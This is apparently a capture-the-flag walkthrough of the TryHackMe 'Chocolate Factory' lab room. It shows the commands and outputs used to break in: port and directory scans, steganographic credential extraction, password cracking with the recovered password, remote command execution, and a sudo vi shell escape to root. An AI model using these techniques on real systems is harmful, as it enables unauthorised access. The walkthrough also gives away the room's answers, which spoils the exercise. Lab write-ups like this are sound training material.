---
title: Walkthrough - Chocolate Factory
published: True
---

Find hidden keys, python programs and use base in A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!

[https://tryhackme.com/room/chocolatefactory](https://tryhackme.com/room/chocolatefactory)

* * *

## Notes

- ``sudo nmap -Pn -sS -p- -T4 10.10.192.137 -vvv``
- ``sudo nmap -sV -sT -sC -p21,22,80``

```shell 
PORT    STATE SERVICE    REASON
21/tcp  open  ftp        syn-ack ttl 61
22/tcp  open  ssh        syn-ack ttl 61
80/tcp  open  http       syn-ack ttl 61
100/tcp open  newacct    syn-ack ttl 61
101/tcp open  hostname   syn-ack ttl 61
102/tcp open  iso-tsap   syn-ack ttl 61
103/tcp open  gppitnp    syn-ack ttl 61
104/tcp open  acr-nema   syn-ack ttl 61
105/tcp open  csnet-ns   syn-ack ttl 61
106/tcp open  pop3pw     syn-ack ttl 61
107/tcp open  rtelnet    syn-ack ttl 61
108/tcp open  snagas     syn-ack ttl 61
109/tcp open  pop2       syn-ack ttl 61
110/tcp open  pop3       syn-ack ttl 61
111/tcp open  rpcbind    syn-ack ttl 61
112/tcp open  mcidas     syn-ack ttl 61
113/tcp open  ident      syn-ack ttl 61
114/tcp open  audionews  syn-ack ttl 61
115/tcp open  sftp       syn-ack ttl 61
116/tcp open  ansanotify syn-ack ttl 61
117/tcp open  uucp-path  syn-ack ttl 61
118/tcp open  sqlserv    syn-ack ttl 61
119/tcp open  nntp       syn-ack ttl 61
120/tcp open  cfdptkt    syn-ack ttl 61
121/tcp open  erpc       syn-ack ttl 61
122/tcp open  smakynet   syn-ack ttl 61
123/tcp open  ntp        syn-ack ttl 61
124/tcp open  ansatrader syn-ack ttl 61
125/tcp open  locus-map  syn-ack ttl 61

21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.127.225
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

- ``gobuster dir -u http://10.10.192.137/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt -t 100 --no-error``

- the ftp we find a picture of wrigleys gum
- using ``stegseek`` we can get a base64 encrypted textfile. we can use ``base64 -d`` on it and we see its a user:pass list with charlie. lets crack.
- ``john charlie.hash --wordlist=/usr/share/seclists/Passwords/rockyou.txt``

```shell
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/Chocolate-Factory]
└─$ john charlie.hash --wordlist=/usr/share/seclists/Passwords/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cn7824           (charlie)     
1g 0:00:06:41 DONE (2022-07-29 04:42) 0.002489g/s 2451p/s 2451c/s 2451C/s cocker6..cn123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- we can login to the http server page with these creds and it brings us to a page where we can execute commands remotely
- and ``ls`` shows us the files we can wget over to our machine.
- checking ``key_rev_key`` looks like we need a name to open the file to get a key. But trying every name I cant find anything. 
- checking the home directory we can find a ssh key with no password we can use to ssh in with charlie.

* * * 

## Enter the key you found!

- Using ``strings`` we can find the name and the key.

* * * 

## What is Charlie's password?

- we found this already with stegseek

* * * 

## change user to charlie

- login to ssh with the non password protected rsa key

* * * 

## Enter the user flag

- ``cat user.txt``

* * * 

## Enter the root flag

```shell
User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

- we can privesc with vim
- ``sudo vi -c ':!/bin/sh' /dev/null``
- ``python /root/rooy.py`` and enter the key we found with ``strings`` on ``key_rev_key``

![0xskar](/assets/chocolate-factory01.png)

* * * 

